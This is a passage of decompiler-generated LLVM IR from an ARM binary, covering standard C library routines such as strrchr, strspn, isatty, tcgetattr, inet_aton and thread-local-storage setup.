  store i32 %v1_176ec, i32* @r4, align 4
  br i1 %v2_176e4, label %dec_label_pc_176f4, label %dec_label_pc_176d0

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176dc, %dec_label_pc_176d0, %entry
  %v0_176f4 = phi i32 [ 0, %entry ], [ %v0_176dc, %dec_label_pc_176d0 ], [ %v1_176dc, %dec_label_pc_176dc ]
  %v2_176f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_176f8, i32* @r4, align 4
  store i32 %v6_176bc, i32* @r5, align 4
  store i32 %v9_176bc, i32* @r6, align 4
  ret i32 %v0_176f4

; uselistorder directives
  uselistorder i32 %v3_176e0, { 1, 0 }
  uselistorder i32 %v0_176e8.pre, { 1, 0 }
  uselistorder i32 %v0_176e0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_176d0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17704 = urem i32 %arg2, 256
  store i32 %v1_17704, i32* @r4, align 4
  %v2_17704 = icmp eq i32 %v1_17704, 0
  br i1 %v2_17704, label %dec_label_pc_17718, label %dec_label_pc_1772c.preheader

dec_label_pc_1772c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_177343 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17704)
  %v2_177385 = icmp eq i32 %v2_177343, 0
  br i1 %v2_177385, label %dec_label_pc_17740, label %dec_label_pc_17724

dec_label_pc_17718:                               ; preds = %entry
  %v2_1771c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17744

dec_label_pc_17724:                               ; preds = %dec_label_pc_1772c.preheader, %dec_label_pc_17724
  %v2_177346 = phi i32 [ %v2_17734, %dec_label_pc_17724 ], [ %v2_177343, %dec_label_pc_1772c.preheader ]
  store i32 %v2_177346, i32* @r5, align 4
  %v1_17728 = add i32 %v2_177346, 1
  store i32 %v1_17728, i32* @r0, align 4
  %v0_17730 = load i32, i32* @r4, align 4
  %v2_17734 = call i32 @__GI_strchr(i32 %v1_17728, i32 %v0_17730)
  %v2_17738 = icmp eq i32 %v2_17734, 0
  br i1 %v2_17738, label %dec_label_pc_17740, label %dec_label_pc_17724

dec_label_pc_17740:                               ; preds = %dec_label_pc_17724, %dec_label_pc_1772c.preheader
  %v0_17740 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17744

dec_label_pc_17744:                               ; preds = %dec_label_pc_17718, %dec_label_pc_17740
  %storemerge = phi i32 [ %v2_1771c, %dec_label_pc_17718 ], [ %v0_17740, %dec_label_pc_17740 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17734, { 1, 0 }
  uselistorder i32 %v1_17728, { 1, 0 }
  uselistorder i32 %v1_17704, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17744, { 1, 0 }
  uselistorder label %dec_label_pc_17724, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_177802 = load i32, i32* @r0, align 4
  %v1_177803 = inttoptr i32 %v0_177802 to i8*
  %v2_177804 = load i8, i8* %v1_177803, align 1
  %v2_177846 = icmp eq i8 %v2_177804, 0
  br i1 %v2_177846, label %dec_label_pc_17790, label %dec_label_pc_17764.preheader

dec_label_pc_1775c:                               ; preds = %dec_label_pc_17764
  %v1_1776c = add i32 %v0_1776c, 1
  %v9_1775c = icmp eq i8 %v0_1775c10.in, %v2_17764
  br i1 %v9_1775c, label %dec_label_pc_17778, label %dec_label_pc_17764

dec_label_pc_17764:                               ; preds = %dec_label_pc_17764.preheader, %dec_label_pc_1775c
  %v0_1776c = phi i32 [ %tmp, %dec_label_pc_17764.preheader ], [ %v1_1776c, %dec_label_pc_1775c ]
  %v1_17764 = inttoptr i32 %v0_1776c to i8*
  %v2_17764 = load i8, i8* %v1_17764, align 1
  %v2_17768 = icmp eq i8 %v2_17764, 0
  br i1 %v2_17768, label %dec_label_pc_17790, label %dec_label_pc_1775c

dec_label_pc_17778:                               ; preds = %dec_label_pc_1775c
  %v1_17778 = add i32 %v0_17778, 1
  %v1_1777c = add i32 %v0_1777c, 1
  %v1_17780 = inttoptr i32 %v1_1777c to i8*
  %v2_17780 = load i8, i8* %v1_17780, align 1
  %v2_17784 = icmp eq i8 %v2_17780, 0
  br i1 %v2_17784, label %dec_label_pc_17790, label %dec_label_pc_17764.preheader

dec_label_pc_17764.preheader:                     ; preds = %entry, %dec_label_pc_17778
  %v0_1777c = phi i32 [ %v1_1777c, %dec_label_pc_17778 ], [ %v0_177802, %entry ]
  %v0_17778 = phi i32 [ %v1_17778, %dec_label_pc_17778 ], [ 0, %entry ]
  %v0_1775c10.in = phi i8 [ %v2_17780, %dec_label_pc_17778 ], [ %v2_177804, %entry ]
  br label %dec_label_pc_17764

dec_label_pc_17790:                               ; preds = %dec_label_pc_17778, %dec_label_pc_17764, %entry
  %v0_17790 = phi i32 [ 0, %entry ], [ %v0_17778, %dec_label_pc_17764 ], [ %v1_17778, %dec_label_pc_17778 ]
  ret i32 %v0_17790

; uselistorder directives
  uselistorder i8 %v2_17764, { 1, 0 }
  uselistorder i32 %v0_1776c, { 1, 0 }
  uselistorder label %dec_label_pc_17764.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_177a4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_177a4, i32* @r1, align 4
  %v0_177a8 = call i32 @__GI_tcgetattr()
  %v1_177ac = sub i32 1, %v0_177a8
  %v2_177ac = icmp ult i32 %v0_177a8, 2
  br i1 %v2_177ac, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_177bc = phi i32 [ %v1_177ac, %entry ], [ 0, %bb ]
  ret i32 %v1_177bc

; uselistorder directives
  uselistorder i32 %v0_177a8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_177c0 = load i32, i32* @r4, align 4
  %v6_177c0 = load i32, i32* @r5, align 4
  %v9_177c0 = load i32, i32* @r6, align 4
  %v2_177c8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_177cc = load i32, i32* @r1, align 4
  store i32 %v0_177cc, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_177d8 = load i32, i32* @r0, align 4
  %v3_177d8 = call i32 @ioctl(i32 %v0_177d8, i32 21505, i32 %v2_177c8)
  store i32 %v3_177d8, i32* %r0.global-to-local, align 4
  store i32 %v3_177d8, i32* @r5, align 4
  %v2_177dc = icmp eq i32 %v3_177d8, 0
  br i1 %v2_177dc, label %dec_label_pc_177e4, label %dec_label_pc_17828

dec_label_pc_177e4:                               ; preds = %entry
  %v4_177f0 = zext i8 %tmp to i32
  store i32 %v4_177f0, i32* @ip, align 4
  %v3_177f4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_177f4, i32* @r3, align 4
  %v1_177f8 = load i32, i32* @r4, align 4
  %v2_177f8 = add i32 %v1_177f8, 4
  %v3_177f8 = inttoptr i32 %v2_177f8 to i32*
  %v0_177fc = load i32, i32* %r1.global-to-local, align 4
  %v1_177fc = load i32, i32* @r4, align 4
  %v2_177fc = add i32 %v1_177fc, 8
  %v3_177fc = inttoptr i32 %v2_177fc to i32*
  store i32 %v0_177fc, i32* %v3_177fc, align 4
  %v0_17800 = load i32, i32* %r0.global-to-local, align 4
  %v1_17800 = load i32, i32* @r4, align 4
  %v2_17800 = add i32 %v1_17800, 12
  %v3_17800 = inttoptr i32 %v2_17800 to i32*
  store i32 %v0_17800, i32* %v3_17800, align 4
  %v2_17804 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17804, i32* @r1, align 4
  %v1_1780c = load i32, i32* @r4, align 4
  %v2_1780c = inttoptr i32 %v1_1780c to i32*
  store i32 %v3_177f4, i32* %v2_1780c, align 4
  %v0_17810 = load i32, i32* @ip, align 4
  %v1_17810 = trunc i32 %v0_17810 to i8
  %v2_17810 = load i32, i32* @r4, align 4
  %v3_17810 = add i32 %v2_17810, 16
  %v4_17810 = inttoptr i32 %v3_17810 to i8*
  store i8 %v1_17810, i8* %v4_17810, align 1
  %v0_17814 = load i32, i32* @r4, align 4
  %v1_17814 = add i32 %v0_17814, 17
  store i32 %v1_17814, i32* %r0.global-to-local, align 4
  %v4_17818 = call i32 @__GI_mempcpy(i32 %v1_17814, i32 %v2_17804, i32 19, i32 %v3_177f4)
  store i32 %v4_17818, i32* %r0.global-to-local, align 4
  %v0_1781c = load i32, i32* @r5, align 4
  store i32 %v0_1781c, i32* %r1.global-to-local, align 4
  %v3_17824 = inttoptr i32 %v4_17818 to i8*
  %v4_17824 = call i32 @__GI_memset(i8* %v3_17824, i32 %v0_1781c, i32 13)
  store i32 %v4_17824, i32* %r0.global-to-local, align 4
  %v0_17828.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17828

dec_label_pc_17828:                               ; preds = %entry, %dec_label_pc_177e4
  %v0_17828 = phi i32 [ %v3_177d8, %entry ], [ %v0_17828.pre, %dec_label_pc_177e4 ]
  store i32 %v0_17828, i32* %r0.global-to-local, align 4
  store i32 %v3_177c0, i32* @r4, align 4
  store i32 %v6_177c0, i32* @r5, align 4
  store i32 %v9_177c0, i32* @r6, align 4
  ret i32 %v0_17828

; uselistorder directives
  uselistorder i32 %v0_17828, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 14, 1, 4, 17, 18, 5, 19, 15, 16, 6, 7, 8, 9, 2, 20, 3, 21, 22, 10, 23, 11, 24, 25, 26, 0, 27, 12, 28, 13 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17828, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1783c = load i32, i32* @r4, align 4
  store i32 %v3_1783c, i32* %stack_var_-28, align 4
  %v0_17844 = load i32, i32* @r0, align 4
  %v2_17844 = icmp eq i32 %v0_17844, 0
  %v0_1784c = load i32, i32* @r1, align 4
  br i1 %v2_17844, label %dec_label_pc_17920, label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %entry
  br label %dec_label_pc_1786c

dec_label_pc_1786c:                               ; preds = %dec_label_pc_17854, %dec_label_pc_178e4
  %v1_178e4 = phi i32 [ 0, %dec_label_pc_17854 ], [ %v5_178e4, %dec_label_pc_178e4 ]
  %v0_178e8 = phi i32 [ 1, %dec_label_pc_17854 ], [ %v1_178e8, %dec_label_pc_178e4 ]
  %v0_1786c = phi i32 [ %v0_17844, %dec_label_pc_17854 ], [ %v0_1786c13, %dec_label_pc_178e4 ]
  %v1_1786c = inttoptr i32 %v0_1786c to i8*
  %v2_1786c = load i8, i8* %v1_1786c, align 1
  %v3_1786c = zext i8 %v2_1786c to i32
  %v4_17870 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 276) to i32*), align 4
  %v2_17874 = mul nuw nsw i32 %v3_1786c, 2
  %v2_17878 = add i32 %v2_17874, %v4_17870
  %v3_17878 = inttoptr i32 %v2_17878 to i16*
  %v4_17878 = load i16, i16* %v3_17878, align 2
  %v1_1787c = and i16 %v4_17878, 8
  %v2_1787c = icmp eq i16 %v1_1787c, 0
  br i1 %v2_1787c, label %dec_label_pc_17920, label %dec_label_pc_17884

dec_label_pc_17884:                               ; preds = %dec_label_pc_1786c
  br label %dec_label_pc_178a4

dec_label_pc_1788c:                               ; preds = %dec_label_pc_178a4
  %v2_1788c = mul i32 %v0_178e4, 10
  %v1_17890 = add i32 %v2_1788c, -48
  %v2_17894 = add i32 %v3_178a4, %v1_17890
  %v8_1789c = icmp sgt i32 %v2_17894, 255
  br i1 %v8_1789c, label %dec_label_pc_17920, label %dec_label_pc_178a0

dec_label_pc_178a0:                               ; preds = %dec_label_pc_1788c
  %v1_178a0 = add i32 %v0_178d4, 1
  store i32 %v1_178a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_178a4

dec_label_pc_178a4:                               ; preds = %dec_label_pc_17884, %dec_label_pc_178a0
  %v0_178e4 = phi i32 [ 0, %dec_label_pc_17884 ], [ %v2_17894, %dec_label_pc_178a0 ]
  %v0_178d4 = phi i32 [ %v0_1786c, %dec_label_pc_17884 ], [ %v1_178a0, %dec_label_pc_178a0 ]
  %v1_178a4 = inttoptr i32 %v0_178d4 to i8*
  %v2_178a4 = load i8, i8* %v1_178a4, align 1
  %v3_178a4 = zext i8 %v2_178a4 to i32
  %v2_178a8 = mul nuw nsw i32 %v3_178a4, 2
  %v2_178ac = add i32 %v2_178a8, %v4_17870
  %v3_178ac = inttoptr i32 %v2_178ac to i16*
  %v4_178ac = load i16, i16* %v3_178ac, align 2
  %v6_178ac = zext i16 %v4_178ac to i32
  %v1_178b0 = and i32 %v6_178ac, 8
  %v2_178b0 = icmp eq i32 %v1_178b0, 0
  br i1 %v2_178b0, label %dec_label_pc_178b8, label %dec_label_pc_1788c

dec_label_pc_178b8:                               ; preds = %dec_label_pc_178a4
  %v7_178b8 = icmp eq i32 %v0_178e8, 4
  br i1 %v7_178b8, label %dec_label_pc_178d0, label %dec_label_pc_178c0

dec_label_pc_178c0:                               ; preds = %dec_label_pc_178b8
  %v7_178c0 = icmp eq i8 %v2_178a4, 46
  br i1 %v7_178c0, label %dec_label_pc_178c8, label %dec_label_pc_17920

dec_label_pc_178c8:                               ; preds = %dec_label_pc_178c0
  %v1_178c8 = add i32 %v0_178d4, 1
  store i32 %v1_178c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_178e4

dec_label_pc_178d0:                               ; preds = %dec_label_pc_178b8
  %v2_178d0 = icmp eq i8 %v2_178a4, 0
  %v1_178d4 = add i32 %v0_178d4, 1
  store i32 %v1_178d4, i32* %r0.global-to-local, align 4
  br i1 %v2_178d0, label %dec_label_pc_178e4, label %dec_label_pc_178dc

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178d0
  %v1_178dc = and i32 %v6_178ac, 32
  %v2_178dc = icmp eq i32 %v1_178dc, 0
  br i1 %v2_178dc, label %dec_label_pc_17920, label %dec_label_pc_178e4

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178dc, %dec_label_pc_178d0, %dec_label_pc_178c8
  %v0_1786c13 = phi i32 [ %v1_178d4, %dec_label_pc_178dc ], [ %v1_178d4, %dec_label_pc_178d0 ], [ %v1_178c8, %dec_label_pc_178c8 ]
  %v4_178e4 = mul i32 %v1_178e4, 256
  %v5_178e4 = or i32 %v0_178e4, %v4_178e4
  %v1_178e8 = add nuw nsw i32 %v0_178e8, 1
  %v7_178f0 = icmp slt i32 %v1_178e8, 5
  br i1 %v7_178f0, label %dec_label_pc_1786c, label %dec_label_pc_178f4

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178e4
  %v2_178f4 = icmp eq i32 %v0_1784c, 0
  br i1 %v2_178f4, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_178f4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17924

bb:                                               ; preds = %dec_label_pc_178f4
  %v4_178f8 = udiv i32 %v5_178e4, 16777216
  %v2_178fc = udiv i32 %v5_178e4, 256
  %v5_17900 = and i32 %v2_178fc, 65280
  %v2_17904 = and i32 %v5_178e4, 65280
  %v5_17908 = mul nuw nsw i32 %v2_17904, 256
  %v5_1790c = mul i32 %v0_178e4, 16777216
  %v6_17900 = or i32 %v4_178f8, %v5_1790c
  %v6_17908 = or i32 %v6_17900, %v5_17900
  %v6_1790c = or i32 %v6_17908, %v5_17908
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17918 = inttoptr i32 %v0_1784c to i32*
  store i32 %v6_1790c, i32* %v3_17918, align 4
  %v2_17924.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17928.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17924

dec_label_pc_17920:                               ; preds = %dec_label_pc_178c0, %dec_label_pc_178dc, %dec_label_pc_1786c, %dec_label_pc_1788c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17924

dec_label_pc_17924:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17920
  %v1_17928 = phi i32 [ %v1_17928.pre, %bb ], [ 0, %dec_label_pc_17920 ], [ 1, %.thread8.thread ]
  %v2_17924 = phi i32 [ %v2_17924.pre, %bb ], [ %v3_1783c, %dec_label_pc_17920 ], [ %v3_1783c, %.thread8.thread ]
  store i32 %v2_17924, i32* @r4, align 4
  ret i32 %v1_17928

; uselistorder directives
  uselistorder i32 %v1_178e8, { 1, 0 }
  uselistorder i32 %v5_178e4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_178d4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 65280, { 73, 1, 52, 2, 9, 3, 0, 4, 5, 53, 54, 10, 11, 6, 12, 55, 56, 43, 13, 14, 15, 16, 17, 46, 47, 44, 45, 57, 58, 59, 50, 51, 48, 49, 60, 61, 62, 18, 19, 20, 21, 22, 63, 64, 23, 24, 25, 65, 26, 27, 66, 28, 29, 30, 31, 67, 32, 33, 68, 34, 35, 36, 37, 69, 70, 38, 39, 40, 41, 42, 71, 7, 72, 8, 74 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 5, 18, 6, 19, 20, 21, 22, 23 }
  uselistorder i32 276, { 1, 0 }
  uselistorder label %dec_label_pc_17924, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17920, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_178a4, { 1, 0 }
  uselistorder label %dec_label_pc_1786c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17940 = load i32, i32* @r4, align 4
  store i32 %v3_17940, i32* %stack_var_-16, align 4
  %v4_17944 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1794c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17954 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 36) to i32*), align 4
  store i32 %v4_17954, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1795c = inttoptr i32 %v4_17944 to i32*
  %v2_1795c = load i32, i32* %v1_1795c, align 4
  %v4_17960 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 52) to i32*), align 4
  store i32 %v4_17960, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17968 = add i32 %v2_1795c, 15
  %v4_1796c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 144) to i32*), align 4
  store i32 %v4_1796c, i32* @ip, align 4
  %v1_17970 = load i32, i32* @r0, align 4
  %v2_17970 = add i32 %v1_17970, %v1_17968
  %v1_17974 = inttoptr i32 %v4_1794c to i32*
  %v2_17974 = load i32, i32* %v1_17974, align 4
  store i32 %v2_17974, i32* %r3.global-to-local, align 4
  %v1_17978 = and i32 %v2_17970, -16
  store i32 %v1_17978, i32* %v1_1795c, align 4
  %v0_17980 = load i32, i32* @r0, align 4
  %v1_17980 = load i32, i32* %r4.global-to-local, align 4
  %v2_17980 = inttoptr i32 %v1_17980 to i32*
  store i32 %v0_17980, i32* %v2_17980, align 4
  %v0_17984 = load i32, i32* @r1, align 4
  %v1_17984 = load i32, i32* %lr.global-to-local, align 4
  %v2_17984 = inttoptr i32 %v1_17984 to i32*
  store i32 %v0_17984, i32* %v2_17984, align 4
  %v0_17988 = load i32, i32* %r3.global-to-local, align 4
  %v1_17988 = load i32, i32* @ip, align 4
  %v2_17988 = inttoptr i32 %v1_17988 to i32*
  store i32 %v0_17988, i32* %v2_17988, align 4
  %v2_1798c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1798c, i32* %r4.global-to-local, align 4
  %v1_17990 = load i32, i32* @r0, align 4
  ret i32 %v1_17990

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17998(i32 %arg1) local_unnamed_addr {
dec_label_pc_17998:
  %v0_17998 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17998, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17998
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17998, %bb
  %v4_179a8 = phi i32 [ %arg1, %dec_label_pc_17998 ], [ 0, %bb ]
  ret i32 %v4_179a8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r3.global-to-local, align 4
  %v4_179bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 84) to i32*), align 4
  store i32 %v4_179bc, i32* @lr, align 4
  %v4_179c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_179e8 = inttoptr i32 %v4_179c8 to i32*
  store i32 1, i32* %v2_179e8, align 4
  %v0_179ec = load i32, i32* %r3.global-to-local, align 4
  %v1_179ec = load i32, i32* @lr, align 4
  %v2_179ec = inttoptr i32 %v1_179ec to i32*
  store i32 %v0_179ec, i32* %v2_179ec, align 4
  %v0_179f0 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17a08(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17a08:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17a08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a08, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17a08
  %v2_17a08 = load i32, i32* @r4, align 4
  %v8_17a08 = ashr i32 %v2_17a08, %tmp
  %v9_17a08 = and i32 %v8_17a08, %tmp
  %v2_17a0c = load i32, i32* @ip, align 4
  %v8_17a0c = lshr i32 %v2_17a0c, %v9_17a08
  %v9_17a0c = and i32 %v8_17a0c, %v9_17a08
  store i32 %v9_17a0c, i32* %r0.global-to-local, align 4
  %v4_17a10 = inttoptr i32 %v9_17a0c to i32*
  store i32 %arg2, i32* %v4_17a10, align 4
  %v5_17a10 = load i32, i32* @ip, align 4
  %v6_17a10 = load i32, i32* %r0.global-to-local, align 4
  %v7_17a10 = sub i32 %v6_17a10, %v5_17a10
  store i32 %v7_17a10, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17a08, %bb
  %v8_17a10 = phi i32 [ %tmp, %dec_label_pc_17a08 ], [ %v7_17a10, %bb ]
  ret i32 %v8_17a10

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_17a1c = call i32 @__aeabi_read_tp()
  %v1_17a20 = inttoptr i32 %v0_17a1c to i32*
  %v2_17a20 = load i32, i32* %v1_17a20, align 4
  %v1_17a24 = add i32 %arg1, 4
  %v2_17a24 = inttoptr i32 %v1_17a24 to i32*
  %v3_17a24 = load i32, i32* %v2_17a24, align 4
  %v1_17a28 = add i32 %v2_17a20, 8
  %v2_17a28 = inttoptr i32 %v1_17a28 to i32*
  %v3_17a28 = load i32, i32* %v2_17a28, align 4
  %v2_17a2c = add i32 %v3_17a28, %v3_17a24
  ret i32 %v2_17a2c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17a38 = load i32, i32* @r4, align 4
  store i32 %v3_17a38, i32* %stack_var_-36, align 4
  %v6_17a38 = load i32, i32* @r5, align 4
  %v15_17a38 = load i32, i32* @r8, align 4
  %v18_17a38 = load i32, i32* @sb, align 4
  %v21_17a38 = load i32, i32* @sl, align 4
  %v24_17a38 = load i32, i32* @fp, align 4
  %v27_17a38 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %sl.global-to-local, align 4
  %v4_17a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 104) to i32*), align 4
  store i32 %v4_17a48, i32* %r3.global-to-local, align 4
  %v1_17a4c = inttoptr i32 %v4_17a48 to i32*
  %v2_17a4c = load i32, i32* %v1_17a4c, align 4
  store i32 %v2_17a4c, i32* %r2.global-to-local, align 4
  %v2_17a50 = icmp eq i32 %v2_17a4c, 0
  %v0_17a58 = load i32, i32* %r0.global-to-local, align 4
  %v0_17a5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17a5c, i32* %ip.global-to-local, align 4
  br i1 %v2_17a50, label %dec_label_pc_17c24, label %dec_label_pc_17a64

dec_label_pc_17a64:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17a68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 156) to i32*), align 4
  store i32 %v4_17a68, i32* @lr, align 4
  store i32 %v2_17a4c, i32* %r1.global-to-local, align 4
  %v1_17ab0 = inttoptr i32 %v4_17a68 to i32*
  %v2_17ab061 = load i32, i32* %v1_17ab0, align 4
  %v4_17ab462 = mul i32 %v2_17ab061, 32
  %v5_17ab463 = add i32 %v4_17ab462, %v2_17a4c
  store i32 %v5_17ab463, i32* %r3.global-to-local, align 4
  %v3_17ab865 = icmp ult i32 %v2_17a4c, %v5_17ab463
  br i1 %v3_17ab865, label %dec_label_pc_17a74, label %dec_label_pc_17c24.loopexit

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a64, %dec_label_pc_17aac
  %v0_17a8c66 = phi i32 [ %v1_17aac, %dec_label_pc_17aac ], [ %v2_17a4c, %dec_label_pc_17a64 ]
  %v1_17a74 = inttoptr i32 %v0_17a8c66 to i32*
  %v2_17a74 = load i32, i32* %v1_17a74, align 4
  store i32 %v2_17a74, i32* %r3.global-to-local, align 4
  %v7_17a78 = icmp eq i32 %v2_17a74, 7
  br i1 %v7_17a78, label %dec_label_pc_17a80, label %dec_label_pc_17aac

dec_label_pc_17a80:                               ; preds = %dec_label_pc_17a74
  %v1_17a80 = add i32 %v0_17a8c66, 20
  %v2_17a80 = inttoptr i32 %v1_17a80 to i32*
  %v3_17a80 = load i32, i32* %v2_17a80, align 4
  store i32 %v3_17a80, i32* %r3.global-to-local, align 4
  %v1_17a84 = add i32 %v0_17a8c66, 28
  %v2_17a84 = inttoptr i32 %v1_17a84 to i32*
  %v3_17a84 = load i32, i32* %v2_17a84, align 4
  store i32 %v3_17a84, i32* @r6, align 4
  %v1_17a8c = add i32 %v0_17a8c66, 16
  %v2_17a8c = inttoptr i32 %v1_17a8c to i32*
  %v3_17a8c = load i32, i32* %v2_17a8c, align 4
  store i32 %v3_17a8c, i32* %r3.global-to-local, align 4
